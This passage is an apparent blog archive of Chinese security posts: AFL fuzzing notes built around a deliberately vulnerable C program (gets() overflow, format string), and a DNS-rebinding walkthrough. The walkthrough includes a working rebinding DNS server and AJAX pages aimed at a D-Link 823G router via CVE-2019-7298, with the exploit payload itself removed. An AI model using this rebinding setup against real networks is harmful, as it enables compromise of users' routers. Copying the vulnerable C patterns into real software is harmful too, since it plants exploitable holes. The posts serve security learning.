    <content><![CDATA[<h2 id="AFL-Fuzzing-study-notes"><a href="#AFL-Fuzzing-study-notes" class="headerlink" title="AFL Fuzzing study notes"></a>AFL Fuzzing study notes</h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>本文采用的测试环境是<code>ubuntu 16.04</code></p>
<p><code>AFL</code>下载地址: <a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/afl/</a> </p>
<pre><code class="shell">tar -zxvf afl-latest.tgz    # 解压代码

# 编译安装
cd afl-2.52b
make 
sudo make install</code></pre>
<p>不出意外可以直接编译成功,之后在终端输入<code>afl-</code>,按两下<code>tab</code>,会出现一些命令</p>
<p><img src="http://file.smilehacker.net/1570950620531.png" alt="1570950620531"></p>
<a id="more"></a>


<h2 id="有源码AFL测试-源码插桩"><a href="#有源码AFL测试-源码插桩" class="headerlink" title="有源码AFL测试-源码插桩"></a>有源码AFL测试-源码插桩</h2><p>测试代码如下:</p>
<pre><code class="c">#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;unistd.h&gt; 
#include &lt;string.h&gt; 
#include &lt;signal.h&gt; 

int vuln(char *str)
{
    int len = strlen(str);
    if(str[0] == &#39;A&#39; &amp;&amp; len == 66)
    {
        raise(SIGSEGV);
        //如果输入的字符串的首字符为A并且长度为66，则异常退出
    }
    else if(str[0] == &#39;F&#39; &amp;&amp; len == 6)
    {
        raise(SIGSEGV);
        //如果输入的字符串的首字符为F并且长度为6，则异常退出
    }
    else
    {
        printf(&quot;it is good!\n&quot;);
    }
    return 0;
}

int main(int argc, char *argv[])
{
    char buf[100]={0};
    gets(buf);//存在栈溢出漏洞
    printf(buf);//存在格式化字符串漏洞
    vuln(buf);

    return 0;
}</code></pre>
<p><code>afl-fuzz</code>基本流程</p>
<ul>
<li>使用<code>afl-gcc</code>对代码进行插桩编译</li>
<li>生成<code>testcase</code>(输入文件)，最好小于<code>1k</code>，如果大于<code>1k</code>影响效率</li>
<li>启动<code>afl-fuzz</code>程序，将<code>testcase</code>作为程序的输入执行程序</li>
<li><code>afl</code>会在<code>testcase</code>的基础上自动变异输入，让程序<code>crash</code>，并记录<code>crash</code>信息</li>
</ul>
<h3 id="插桩编译"><a href="#插桩编译" class="headerlink" title="插桩编译"></a>插桩编译</h3><p>将上面的程序用<code>afl-gcc</code>编译</p>
<pre><code class="shell">afl-gcc -g -o afl_test afl_test.c</code></pre>
<p>如果是编译C++源码，就要将<code>afl-gcc</code>替换成<code>afl-g++</code></p>
<p>接着建立两个文件<code>afl_in</code>，<code>afl_out</code>用来存放程序的输入和<code>Fuzz</code>输出的结果。</p>
<pre><code class="shell">mkdir afl_in afl_out</code></pre>
<p>到此，还需要一个<code>testcase</code>文件，将<code>testcase</code>文件中的内容喂给程序</p>
<pre><code class="shell">echo &quot;aaa&quot; &gt; afl_in/testcase  # testcase中的内容可以为任意内容</code></pre>
<p><strong>备注:</strong></p>
<p>目标程序中有<code>makefile</code>文件，分两种情况</p>
<ol>
<li><p>程序用<code>autoconf</code>构建</p>
<pre><code class="shell">./configure CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot;</code></pre>
<p> 此外，还可以执行如下语句设置<code>LD_LIBRARY_PATH</code>让程序加载经过<code>AFL</code>插桩的<code>.so</code>文件，进行静态构建而不是动态链接 </p>
<pre><code class="shell">./configure --disable-shared CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot;</code></pre>
</li>
<li><p>程序不是<code>autoconf</code>构建， 那么直接修改Makefile文件中的编译器为<code>afl-gcc/g++</code>。</p>
<p> 为了后期更好的分析crash，在此处可以开启<code>Address Sanitizer(ASAN)</code>这个内存检测工具，此工具可以更好的检测出缓存区溢出、<code>UAF</code>等内存漏洞，开启方法如下: </p>
<pre><code class="shell">AFL_USE_ASAN=1 ./configure CC=afl-gcc CXX=afl-g++ LD=afl-gcc--disable-shared
AFL_USE_ASAN=1 make</code></pre>
</li>
</ol>
<pre><code>不使用 `AFL`编译插桩时，可使用以下方式开启 `Address Sanitizer`</code></pre><pre><code class="shel">   ./configure CC=gcc CXX=g++ CFLAGS=&quot;-g -fsanitize=address&quot;</code></pre>
<h3 id="开始Fuzz"><a href="#开始Fuzz" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h3><p><code>Fuzz</code>的语法一般有两种</p>
<ol>
<li><p>直接从<code>stdin</code>读取输入的目标程序</p>
<pre><code class="shell">afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</code></pre>
</li>
<li><p>从文件读取输入的目标程序，@@就是占位符，表示输入替换的位置 </p>
<pre><code class="shell">afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</code></pre>
</li>
</ol>
<p>常见命令的含义:</p>
<ul>
<li>-f参数表示：<code>testcase</code>的内容会作为<code>afl_test</code>的<code>stdin</code></li>
<li>-m参数表示分配的内存空间</li>
<li>-i 指定测试样本的路径</li>
<li>-o 指定输出结果的路径</li>
<li>/dev/null 使错误信息不输出到屏幕</li>
<li>-t：设置程序运行超时值，单位为 ms</li>
<li>-M：运行主(Master) <code>Fuzzer</code></li>
<li>-S：运行从属(Slave) <code>Fuzzer</code></li>
</ul>
<p>运行<code>afl-fuzz</code></p>
<pre><code class="shell">afl-fuzz -i afl_in/ -o afl_out/ ./afl_test -f</code></pre>
<p>此处如果第一次运行会报一个错误</p>
<p><img src="http://file.smilehacker.net/1571209319832.png" alt="1571209319832"></p>
<pre><code class="shell">Pipe at the beginning of &#39;core_pattern&#39;</code></pre>
<p>解决方法如下:</p>
<pre><code class="shell">sudo su
echo core &gt;/proc/sys/kernel/core_pattern</code></pre>
<h3 id="Fuzz运行界面"><a href="#Fuzz运行界面" class="headerlink" title="Fuzz运行界面"></a>Fuzz运行界面</h3><p><img src="http://file.smilehacker.net/1570957117241.png" alt="1570957117241"></p>
<p>下面选择界面上几个重要的部分来介绍一下</p>
<ul>
<li><p>process timing :</p>
<ul>
<li>run time : 当前Fuzz的运行时间</li>
<li>last new path : 最后一次发现新路径的时间</li>
<li>last uniq crash : 最后一次崩溃的时间</li>
<li>last uniq hang : 最后一次超时的时间</li>
</ul>
<p>值得注意的是第二项<code>last new path</code>, 最近一次发现新路径的时间。如果由于目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的，所以如果从fuzzing开始一直没有发现新的执行路径，那么就要考虑是否有二进制或者命令行参数错误的问题了。对于此状况，<code>AFL</code>也会智能地进行提醒 。</p>
</li>
<li><p>overall results:</p>
<ul>
<li><p>cycles done : 运行的总周期处</p>
</li>
<li><p>total path : 当前发现的总路径数</p>
</li>
<li><p>uniq crashes : 当前崩溃测试</p>
</li>
<li><p>uniq hangs : 当前程序响应超时次数</p>
<p><code>total path</code>可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。一般来说，当其变为绿色时，代表可执行的内容已经很少了，继续fuzzing下去也不会有什么新的发现了。此时，我们便可以通过<code>Ctrl-C</code>，中止当前的fuzzing </p>
</li>
</ul>
</li>
<li><p>stage progress</p>
<ul>
<li><p>now trying : 正在测试的<code>Fuzz</code>策略</p>
</li>
<li><p>stage execs: 当前测试的进度</p>
</li>
<li><p>total execs:目标的执行总次数</p>
</li>
<li><p>exec speed : 目标的实行速度</p>
<p><code>exec speed</code>可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing </p>
</li>
</ul>
</li>
</ul>
<p>以上是运行界面常用的关注点, 想要查看具体的介绍请查看<a href="http://lcamtuf.coredump.cx/afl/status_screen.txt" target="_blank" rel="noopener">官方文档</a></p>
<h3 id="Crash分析"><a href="#Crash分析" class="headerlink" title="Crash分析"></a>Crash分析</h3><p>通过上图，稍微跑了不到一分钟，发现了5个<code>crash</code></p>
<p>查看<code>afl_out</code>生成的文件:</p>
<p><img src="http://file.smilehacker.net/1570955956378.png" alt="1570955956378"></p>
<ul>
<li><code>crashes</code> : 存放使程序产生<code>crash</code>的样例</li>
<li><code>hangs</code> : 使程序产生超时的样例</li>
<li><code>queue</code>: 存放每个不同执行路径的用例</li>
</ul>
<p>我们来看看<code>crashes</code> 目录下的几个样例</p>
<p><img src="http://file.smilehacker.net/1570957526718.png" alt="1570957526718"></p>
<p>想要具体分析，我们只需要把得到的<code>crash</code>文件作为参数输入到程序中，使用gdb调试分析就可以得到详细的结果。在分析之前先用<code>xxd</code>命令查看下文件内容，对产生的异常做一个初步判断。</p>
<ul>
<li><p>可能为缓冲区溢出：</p>
<p><img src="http://file.smilehacker.net/1570957848925.png" alt="1570957848925"></p>
</li>
<li><p>可能为预期内的异常,<code>F</code>开头且长度为6</p>
<p><img src="http://file.smilehacker.net/1570957969884.png" alt="1570957969884"></p>
</li>
<li><p>缓冲区溢出？</p>
<p><img src="http://file.smilehacker.net/1570958012787.png" alt="1570958012787"></p>
</li>
<li><p>根据源代码基本可以确定为格式化字符串漏洞</p>
<p><img src="http://file.smilehacker.net/1570958072893.png" alt="1570958072893"></p>
</li>
<li><p>可能使预料中的异常</p>
<p><img src="http://file.smilehacker.net/1570958118182.png" alt="1570958118182"></p>
</li>
</ul>
<p>在文末补充具体的异常调试</p>
<h2 id="有源码AFL测试-LLVM模式"><a href="#有源码AFL测试-LLVM模式" class="headerlink" title="有源码AFL测试-LLVM模式"></a>有源码AFL测试-LLVM模式</h2><p><code>LLVM Mode</code>模式编译程序可以获得更快的Fuzzing速度，因此针对大型项目可以考虑启用</p>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>安装系统依赖包:</p>
<pre><code class="shell">sudo apt install llvm clang</code></pre>
<p>进入<code>AFL</code>源码目录编译<code>afl llvm</code>模块</p>
<pre><code class="shell">cd llvm_mode/

make</code></pre>
<p>编译完成后,在<code>AFL</code>跟目录下应该出现了<code>afl-clang-fast</code>,后面编译代码时使用<code>afl-clang-fast</code>构建程序即可。需要添加一下软连接</p>
<pre><code class="shel">sudo ln -s /home/tt/afl-2.52b/afl-clang-fast[源路径] /usr/local/bin/afl-clang-fast[目标路径]</code></pre>
<h3 id="llvm-model编译代码"><a href="#llvm-model编译代码" class="headerlink" title="llvm model编译代码"></a><code>llvm model</code>编译代码</h3><p>使用<code>afl-clang-fast</code>编译最初存在漏洞的代码</p>
<pre><code class="shell">afl-clang-fast -g afl_test.c -o afl_test</code></pre>
<p><img src="http://file.smilehacker.net/1571023550045.png" alt="1571023550045"></p>
<h3 id="开始Fuzz-1"><a href="#开始Fuzz-1" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h3><pre><code class="shell">afl-fuzz -i afl_in -o afl_out ./afl_test -f</code></pre>
<p><img src="http://file.smilehacker.net/1571023823108.png" alt="1571023823108"></p>
<h2 id="无源码的AFL测试-Qemu模式"><a href="#无源码的AFL测试-Qemu模式" class="headerlink" title="无源码的AFL测试-Qemu模式"></a>无源码的AFL测试-Qemu模式</h2><h3 id="安装Qemu"><a href="#安装Qemu" class="headerlink" title="安装Qemu"></a>安装<code>Qemu</code></h3><p>还有一些情况我们根本拿不到程序的代码，没有办法对源码进行插桩，不过<code>AFL</code>提供了<code>qemu</code>模式进行测试</p>
<pre><code class="shell">cd afl-2.52b/qemu-mode

./build_qemu_support.sh 
cd ..
make install </code></pre>
<p>有可能在执行<code>./build_qemu_support.sh</code>时出现如下错误</p>
<p><img src="http://file.smilehacker.net/1570980361643.png" alt="1570980361643"></p>
<p>执行如下代码即可:</p>
<pre><code class="shell">wget http://mirrors.kernel.org/gnu/libtool/libtool-2.2.6b.tar.gz \
&amp;&amp; tar xzvf libtool-2.2.6b.tar.gz \
&amp;&amp; cd libtool-2.2.6b \
&amp;&amp; ./configure –prefix=/usr/local

make &amp;&amp; sudo make install

###############或者#############
sudo apt-get install libtool-bin</code></pre>
<p>编译成功:</p>
<p><img src="http://file.smilehacker.net/1570981177555.png" alt="1570981177555"></p>
<p>回到代码目录,使用<code>gcc</code>重新编译测试代码，并重新执行<code>afl-fuzz</code>命令(这次加上<code>-Q</code>)</p>
<pre><code class="shell">gcc afl_test.c -o afl_test

afl-fuzz -i afl_in/ -o afl_out/ -Q ./afl_test -f</code></pre>
<p>有可能碰到如下错误:</p>
<p><img src="http://file.smilehacker.net/1570982707245.png" alt="1570982707245"></p>
<p>解决方法:</p>
<pre><code class="shell">vim ~/.bashrc

# 在文件结尾添加如下内容
export AFL_PATH=/home/tt/afl-2.52b #你的afl-qemu-trace所在路径，如果根据文章走下来,那就是你的afl源码目录

source ~/.bashrc # 重新加载</code></pre>
<p><img src="http://file.smilehacker.net/1570982887916.png" alt="1570982887916"></p>
<p>重新运行,已经成功运行了,但是对比一下两个模式，会发现在<code>Qemu</code>模式下的速度比源码编译插桩的速度慢了很多。</p>
<h2 id="AFL-Fuzz结果分析"><a href="#AFL-Fuzz结果分析" class="headerlink" title="AFL Fuzz结果分析"></a>AFL Fuzz结果分析</h2><h3 id="工作状态"><a href="#工作状态" class="headerlink" title="工作状态"></a>工作状态</h3><p> <code>afl-fuzz</code>永远不会停止，所以何时停止测试很多时候就是依靠<code>afl-fuzz</code>提供的状态来决定的。具体的几种方式如下所示: </p>
<ul>
<li>状态窗口的<code>cycles done</code>变为绿色;</li>
<li><code>afl-whatsup</code>查看afl-fuzz状态;</li>
<li><code>afl-stat</code>得到类似于afl-whatsup的输出结果;</li>
<li>定制<code>afl-whatsup</code>-&gt;在所有代码外面加个循环就好;</li>
<li>用<code>afl-plot</code>绘制各种状态指标的直观变化趋势;</li>
<li><code>pythia</code>估算发现新crash和path概率。</li>
</ul>
<h3 id="Fuzzing结果"><a href="#Fuzzing结果" class="headerlink" title="Fuzzing结果"></a>Fuzzing结果</h3><ul>
<li>状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考;</li>
<li>距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握;</li>
<li>目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见;</li>
<li>pythia提供的各种数据中，path covera达到99或者correctness的值达到1e-08(含义: 从上次发现path/uniq crash到下一次发现之间大约需要1亿次执行)</li>
</ul>
<h3 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h3><p>在文章中有提到过。</p>
<ul>
<li>queue：存放所有具有独特执行路径的测试用例。</li>
<li>crashes：导致目标接收致命signal而崩溃的独特测试用例。</li>
<li>crashes/README.txt：保存了目标执行这些crash文件的命令行参数。</li>
<li>hangs：导致目标超时的独特测试用例。</li>
<li>fuzzer_stats：afl-fuzz的运行状态。</li>
<li>plot_data：用于afl-plot绘图。</li>
</ul>
<h3 id="对Crash的结果进行简单分析"><a href="#对Crash的结果进行简单分析" class="headerlink" title="对Crash的结果进行简单分析"></a>对Crash的结果进行简单分析</h3><h4 id="crash-exploration-mode"><a href="#crash-exploration-mode" class="headerlink" title="crash exploration mode"></a>crash exploration mode</h4><p> afl-fuzz的一种运行模式，也称为<code>peruvian rabbit mode</code>，用于确定bug的可利用性，其输入的是crash的信息，之后使用<code>-C</code>启用这种模式，afl会自动探索并创造与之相关的crash来帮助你进行分析，比如判断能够控制某块内存地址的长度。 </p>
<pre><code class="shell">afl-fuzz -m none -C -i ./afl_out/crashes -o ./peruvian-were-rabbit_out -- ./afl_test -f</code></pre>
<h4 id="triage-crashes-sh"><a href="#triage-crashes-sh" class="headerlink" title="triage_crashes.sh"></a>triage_crashes.sh</h4><p> AFL源码的experimental目录中有一个名为triage_crashes.sh的脚本，可以帮助我们触发收集到的crashes。 </p>
<p>直接使用脚本跟参数的话，我们可以看到相关crash情况的寄存器等信息，但是如果只是大致分类的话，可以使用如下命令</p>
<pre><code class="shell">sh /home/tt/afl-2.52b/experimental/crash_triage/triage_crashes.sh ./afl_out ./afl_test  2&gt;&amp;1 | grep SIGNAL</code></pre>
<p><img src="http://file.smilehacker.net/1571025845455.png" alt="1571025845455"></p>
<p>根据输出的11可以做一个大概的判断，但是具体还是需要手动调试</p>
<h4 id="推荐两个分析结果的工具"><a href="#推荐两个分析结果的工具" class="headerlink" title="推荐两个分析结果的工具"></a>推荐两个分析结果的工具</h4><ul>
<li>(afl-content)[ <a href="https://github.com/rc0r/afl-utils" target="_blank" rel="noopener">https://github.com/rc0r/afl-utils</a> ] afl-collect基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。 </li>
<li>(crashwalk)[ <a href="https://github.com/bnagy/crashwalk" target="_blank" rel="noopener">https://github.com/bnagy/crashwalk</a> ] 可以显示更详细的信息</li>
</ul>
<h3 id="代码覆盖率-afl-cov"><a href="#代码覆盖率-afl-cov" class="headerlink" title="代码覆盖率:  afl-cov"></a>代码覆盖率:  <code>afl-cov</code></h3><p>后面补充，现在有一点问题</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>对上面文章做一些补充</p>
<h3 id="缓冲区溢出分析"><a href="#缓冲区溢出分析" class="headerlink" title="缓冲区溢出分析"></a>缓冲区溢出分析</h3><p>使用<code>GDB</code>对缓冲区进行实际分析，在分析前先来看下猜测为导致缓冲区溢的<code>case</code>:</p>
<p><img src="http://file.smilehacker.net/1571209606024.png" alt="1571209606024"></p>
<p>接下来使用<code>GDB</code>加载程序</p>
<pre><code class="shell">gdb afl_test

#直接让程序运行，并且在运行时导入AFL输出导致程序crash的case

run &lt; stackoverflow</code></pre>
<p>这里对文件进行了重命名，不然在<code>gdb</code>中导入会有一点问题。</p>
<p><img src="http://file.smilehacker.net/1571209574876.png" alt="1571209574876"></p>
<p>程序运行后,找到产生<code>crash</code>位置,</p>
<p><img src="http://file.smilehacker.net/1571209819953.png" alt="1571209819953"></p>
<p> 通过栈回溯信息可以看到，程序发生了栈溢出[启用了 canary ,导致栈检查失败，随后奔溃]： </p>
<p><img src="http://file.smilehacker.net/1571209729037.png" alt="1571209729037"></p>
]]></content>
      <categories>
        <category>Fuzz</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>DNSRebind测试笔记</title>
    <url>/post/15454.html</url>
    <content><![CDATA[<h4 id="DNS-Rebind原理"><a href="#DNS-Rebind原理" class="headerlink" title="DNS_Rebind原理"></a>DNS_Rebind原理</h4><p>为了保证<code>DNS</code>服务的可靠性，<code>DNS</code>响应记录<code>A</code>中包含一个<code>TTL（time to live）</code>值，表示当前解析结果的有效时间，客户端（浏览器）会在超过这个时间值后重新请求解析域名（取决于客户端是否遵循这个TTL值），得到的新响应中又会存在一个过期时间，客户端会再次去解析域名，如此保证获取到最新的域名解析结果。</p>
<p>若DNS服务前后响应返回的<code>ip</code>地址不一样，浏览器并不会认为跨域。如果域名后续解析到的<code>ip</code>为<code>127.0.0.1</code>、<code>192.168.0.1</code>等不同于先前解析结果，浏览器依然认为符合同源策略，会将请求发送到<code>127.0.0.1</code>机器上。如此就产生了dns rebinding攻击，从而达到绕过同源策略的目的.</p>
<p>浏览器和操作系统均会存在DNS缓存，缓存时间一般不按照DNS服务器响应中的TTL值。详细见<a href="https://dyn.com/blog/web-browser-dns-caching-bad-thing/" target="_blank" rel="noopener">WEB浏览器缓存问题</a></p>
<ul>
<li>chrome为60s左右</li>
<li>firefox 默认为60s ,可修改</li>
<li>IE为30min</li>
</ul>
<a id="more"></a>

<h4 id="DNS-Rebind攻击场景"><a href="#DNS-Rebind攻击场景" class="headerlink" title="DNS_Rebind攻击场景"></a>DNS_Rebind攻击场景</h4><ol>
<li>受害者访问攻击者的网站<code>www.smilehacker.net</code>,此时的<code>DNS</code>服务正常解析到有一个外网网站</li>
<li>但是网站中有一个隐藏的<code>&lt;iframe&gt;</code>标签,存在使用<code>AJAX</code>发送请求到<code>http://www.smilehacker.net/HNAP1/</code>,在<code>POST</code>数据包中存在对<code>D-Link 823G</code>的漏洞利用代码，</li>
<li>发送<code>&lt;iframe&gt;</code>标签中的<code>AJAX</code>请求,此时<code>DNS</code>的解析已经改变，受害者发送<code>POC</code>到<code>D-Link</code>路由器</li>
</ol>
<h4 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h4><p>看起来一切都很顺利，而且容易，但是这都是建立在<code>TTL=0</code>的情况下。</p>
<p>什么是TTL?</p>
<p><code>TTL(Time to Live)</code>是<code>DNS</code>的缓存时间。当<code>TTL=10</code>的时候，我们在10s内，对该域名进行多次<code>DNS</code>请求，<code>DNS</code>服务器只会收到一次请求，其他都是缓存</p>
<p>所以我们在搭建<code>DNS</code>服务器的时候，需要设置<code>TTL=0</code>,如果<code>TTL</code>不为0，第二次请求的是第一次缓存的外网IP，也就不能绕过。</p>
<p><code>JAVA</code>程序中默认的TTL=10,这个配置会导致<code>DNS Rebind</code>绕过失败，<code>JAVA</code>程序默认不受<code>DNS Rebind</code>的影响</p>
<h4 id="DNS请求过程"><a href="#DNS请求过程" class="headerlink" title="DNS请求过程"></a>DNS请求过程</h4><ol>
<li>查询本地DNS服务器(/etc/resolv.conf) [自己设置的8.8.8.8 114.114.114.114这种的]</li>
<li>如果有缓存则直接返回缓存的结果,不继续往下执行</li>
<li>如果没有缓存,则请求远程DNS服务器，然后返回</li>
</ol>
<h4 id="DNS缓存机制-巨坑！！"><a href="#DNS缓存机制-巨坑！！" class="headerlink" title="DNS缓存机制 [巨坑！！]"></a>DNS缓存机制 [巨坑！！]</h4><p><code>MAC</code>跟<code>Windows</code>上,为了加快<code>HTTP</code>访问速度，系统都会进行<code>DNS</code>缓存。但是在<code>Linux</code>上默认不会进行缓存,除非运行了<code>nscd</code>软件。</p>
<p>但是有些公共的DNS,比如百度的<code>114.114.114.114</code>,即使我们设置了<code>TTL=0</code>,依然会有两分钟的缓存，完全不按照标准协议来。遇到这种情况是无解的。</p>
<ul>
<li>8.8.8.8 本地不会进行<code>DNS</code>缓存。</li>
<li>114.114.114.114 会有两分钟的缓存</li>
</ul>
<p>除了公共DNS缓存的问题,浏览器也会有DNS缓存<a href="https://dyn.com/blog/web-browser-dns-caching-bad-thing/" target="_blank" rel="noopener">WEB浏览器缓存问题</a></p>
<ul>
<li>chrome 一分钟缓存</li>
<li>firefox 默认一分钟缓存(可修改)</li>
<li>IE 30分钟的缓存</li>
<li>QQ浏览器 40分钟左右缓存</li>
<li>Opear 不关掉窗口,缓存一直存在</li>
</ul>
<h4 id="DNS查询过程"><a href="#DNS查询过程" class="headerlink" title="DNS查询过程"></a>DNS查询过程</h4><ol>
<li><p>查看浏览器内部缓存</p>
</li>
<li><p>系统缓存</p>
</li>
<li><p>路由器缓存、ISP 缓存</p>
</li>
<li><p>本地 DNS 服务器</p>
<p>例如:8.8.8.8 114.114.114.114</p>
</li>
<li><p>域名服务器</p>
</li>
</ol>
<p>如果域名正常，应该就会返回 IP 地址，如果没有浏览器就会提示找不到服务器地址。</p>
<h4 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h4><p>使用DNS Rebind利用<a href="https://github.com/leonW7/D-Link/blob/master/Vul_2.md" target="_blank" rel="noopener"><code>CVE-2019-7298</code></a>漏洞攻击<code>D-Link 823G</code>路由器</p>
<p>首先，需要有一个域名,在域名下解析两条记录</p>
<p><img src="http://file.smilehacker.net/1111111111111111111111.png" alt="域名解析"></p>
<p>当访问<code>dns_rebind.smilehacker.net</code>的时候，去找负责解析他的<code>ns.smilehacker.net</code>，也就是<code>43.228.76.56</code>这台机器。</p>
<p>DNS Server的代码如下:<br>使用前安装<code>twisted</code></p>
<blockquote>
<p>pip install twisted -i <a href="https://pypi.douban.com/simple" target="_blank" rel="noopener">https://pypi.douban.com/simple</a></p>
</blockquote>
<pre><code class="python">from twisted.internet import reactor, defer
from twisted.names import client, dns, error, server
record={}
class DynamicResolver(object):
    def _doDynamicResponse(self, query):
        name = query.name.name
        if name not in record or record[name]&lt;1:
            ip = &quot;43.228.76.56&quot;
        else:
            ip = &quot;192.168.0.1&quot;
        if name not in record:
            record[name] = 0
        record[name] += 1
        print name + &quot; ===&gt; &quot; + ip
        answer = dns.RRHeader(
            name = name,
            type = dns.A,
            cls = dns.IN,
            ttl = 0,
            payload = dns.Record_A(address = b&#39;%s&#39; % ip, ttl=0)
        )
        answers = [answer]
        authority = []
        additional = []
        return answers, authority, additional
    def query(self, query, timeout=None):
        return defer.succeed(self._doDynamicResponse(query))
def main():
    factory = server.DNSServerFactory(
        clients=[DynamicResolver(), client.Resolver(resolv=&#39;/etc/resolv.conf&#39;)]
    )
    protocol = dns.DNSDatagramProtocol(controller=factory)
    reactor.listenUDP(53, protocol)
    reactor.run()
if __name__ == &#39;__main__&#39;:
    raise SystemExit(main())
</code></pre>
<p>代码功能:</p>
<ul>
<li>第一次DNS请求返回的IP为43.228.76.56，其余时候返回的都是路由器的IP(192.168.0.1)。</li>
</ul>
<p>剩下只需要把漏洞利用代码放到HTML中就可以了</p>
<p><strong>具体漏洞利用代码已经删除,有兴趣的可自行Google</strong></p>
<p>index.html:</p>
<pre><code class="HTML">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
    &lt;title&gt;&lt;/title&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;iframe src=&quot;ajax.html&quot;&gt;&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>ajax.html</p>
<pre><code class="HTML">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;Title&lt;/title&gt;
    &lt;script src=&quot;./jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;script&gt;

    var xmg_01 = &quot;payload1&quot;;

    var xmg_02 = &quot;payload2&quot;;

    function foo(){
        var settings = {
            &quot;async&quot;: true,
            &quot;crossDomain&quot;: true,
            &quot;url&quot;: &quot;http://dns_rebind.smilehacker.net/&quot;,
            &quot;method&quot;: &quot;POST&quot;,
            &quot;headers&quot;: {
                &quot;Content-Type&quot;: &quot;application/xml&quot;,
                &quot;SOAPAction&quot;: &quot;vuln_address&quot;,
                &quot;cache-control&quot;: &quot;no-cache&quot;,
                &quot;Postman-Token&quot;: &quot;68b84160-c326-4b1a-a001-83b408d6435f&quot;
            },
            &quot;data&quot;: &quot;payload1&quot;
        };

        $.ajax(settings).done(function (response) {
            document.write(response);
        });

        var setting = {
            &quot;async&quot;: true,
            &quot;crossDomain&quot;: true,
            &quot;url&quot;: &quot;http://dns_rebind.smilehacker.net/&quot;,
            &quot;method&quot;: &quot;POST&quot;,
            &quot;headers&quot;: {
                &quot;SOAPAction&quot;: &quot;vuln_address&quot;,
                &quot;cache-control&quot;: &quot;no-cache&quot;,
                &quot;Postman-Token&quot;: &quot;a1a1e78d-faa1-49c6-aef9-0c54b9f3c73b&quot;
            },
            &quot;data&quot;: &quot;payload2&quot;
        };

        $.ajax(setting).done(function (response) {
            test();
            document.write(response);
        });


    }

    function test(){
        document.write(&quot;test&quot;);
    }

&lt;/script&gt;

&lt;input value=&quot;点&quot; type=&quot;button&quot; onclick=&quot;foo()&quot;&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<h4 id="攻击展示图"><a href="#攻击展示图" class="headerlink" title="攻击展示图:"></a>攻击展示图:</h4><ul>
<li>攻击场景1:<br>此处修改了Firefox的DNS缓存时间为0,比且修改了DNS Server中域名返回外网IP的次数</li>
</ul>
<p><img src="http://file.smilehacker.net/22222222222222.gif" alt="Rebind show"></p>
<p>如果该测试放在Chrome下做，需要等待一分钟，等Chrome刷掉自己的DNS缓存</p>
<p>firefox配置:</p>
<ol>
<li>在地址栏输入<code>about:config</code></li>
<li>搜索<code>dns</code>，将network.dnsCacheExpiration、network.dnsCacheExpirationGracePeriod修改为0<br><img src="http://file.smilehacker.net/33333333333333.png" alt="firefox配置"></li>
</ol>
<ul>
<li>攻击场景2:</li>
</ul>
<p>Windows 操作系统、DNS server 为 8.8.8.8、Chrome浏览器默认配置访问<code>URL</code>链接，直接获取路由器反弹shell，等待一分钟左右<br><img src="http://file.smilehacker.net/DNS_Rebind_revershell.gif" alt="Reverse_shell"></p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul>
<li><a href="https://dyn.com/blog/web-browser-dns-caching-bad-thing/" target="_blank" rel="noopener">https://dyn.com/blog/web-browser-dns-caching-bad-thing/</a></li>
<li><a href="https://blog.csdn.net/u014465934/article/details/83241097" target="_blank" rel="noopener">https://blog.csdn.net/u014465934/article/details/83241097</a></li>
<li><a href="https://blog.csdn.net/u011721501/article/details/54667714" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/54667714</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>DNSRebind</tag>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux PWN</title>
    <url>/post/64819.html</url>
    <content><![CDATA[<h2 id="Linux-Pwn"><a href="#Linux-Pwn" class="headerlink" title="Linux Pwn"></a>Linux Pwn</h2><p>之前分析过一些<code>MIPS</code>平台下的二进制，对<code>Linux</code>平台下没怎么研究过。在网上看到一篇文章，写一下总结，比较基础。</p>
<p>不说原理，只说思路跟解题方法</p>
